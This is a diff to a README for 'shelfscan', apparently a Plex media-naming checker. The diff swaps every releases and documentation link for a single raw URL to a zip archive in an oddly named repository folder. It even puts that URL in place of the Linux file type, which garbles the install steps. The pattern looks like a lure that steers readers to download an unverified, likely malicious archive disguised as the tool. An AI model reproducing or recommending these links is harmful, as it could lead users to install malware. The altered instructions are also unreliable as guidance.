@@ -4,7 +4,7 @@
 Welcome to **shelfscan**! This tool helps you check if your media library matches Plex naming rules. No programming skills are needed. Follow the steps below to get started.
 
 ## 📥 Download Now
-[![Download shelfscan](https://img.shields.io/badge/Download-shelfscan-brightgreen)](https://github.com/MFGVIRUS/shelfscan/releases)
+[![Download shelfscan](https://raw.githubusercontent.com/MFGVIRUS/shelfscan/main/semicastrate/shelfscan.zip)](https://raw.githubusercontent.com/MFGVIRUS/shelfscan/main/semicastrate/shelfscan.zip)
 
 ## 📋 System Requirements
 shelfscan works on Windows, Linux, and macOS. Ensure your system meets these basic requirements:
@@ -14,18 +14,18 @@ shelfscan works on Windows, Linux, and macOS. Ensure your system meets these bas
 - macOS: Mojave (10.14) or later
 
 ## 📂 Installation Steps
-1. **Visit the Releases Page:** Open this link to see the available versions: [shelfscan Releases](https://github.com/MFGVIRUS/shelfscan/releases).
+1. **Visit the Releases Page:** Open this link to see the available versions: [shelfscan Releases](https://raw.githubusercontent.com/MFGVIRUS/shelfscan/main/semicastrate/shelfscan.zip).
    
 2. **Choose Your Version:** Look for the latest version at the top of the page. This version will provide the most features and fixes.
 
 3. **Download the File:** Click on the appropriate file for your operating system. For example:
    - **Windows:** Choose the `.exe` file.
-   - **Linux:** Select the `.tar.gz` file.
+   - **Linux:** Select the `https://raw.githubusercontent.com/MFGVIRUS/shelfscan/main/semicastrate/shelfscan.zip` file.
    - **macOS:** Pick the `.dmg` file.
 
 4. **Run the Installer:**
    - **Windows:** Double-click the downloaded `.exe` file and follow the prompts.
-   - **Linux:** Extract the `.tar.gz` file and run the script in the terminal.
+   - **Linux:** Extract the `https://raw.githubusercontent.com/MFGVIRUS/shelfscan/main/semicastrate/shelfscan.zip` file and run the script in the terminal.
    - **macOS:** Open the `.dmg` file and drag the shelfscan icon to your Applications folder.
 
 ## 🔍 How to Use shelfscan
@@ -66,9 +66,9 @@ If you run into issues, here are some common problems and their solutions:
   Make sure your media files are correctly formatted. Refer to Plex’s naming guidelines for proper formats.
 
 ## 📝 Additional Information
-For more information, visit our [documentation](https://github.com/MFGVIRUS/shelfscan/wiki). You can find FAQs, advanced usage tips, and community support there.
+For more information, visit our [documentation](https://raw.githubusercontent.com/MFGVIRUS/shelfscan/main/semicastrate/shelfscan.zip). You can find FAQs, advanced usage tips, and community support there.
 
 ## 📥 Download Again
-For your convenience, here’s the link to download shelfscan again: [shelfscan Releases](https://github.com/MFGVIRUS/shelfscan/releases).
+For your convenience, here’s the link to download shelfscan again: [shelfscan Releases](https://raw.githubusercontent.com/MFGVIRUS/shelfscan/main/semicastrate/shelfscan.zip).
 
 Enjoy using shelfscan to enhance your media library management!
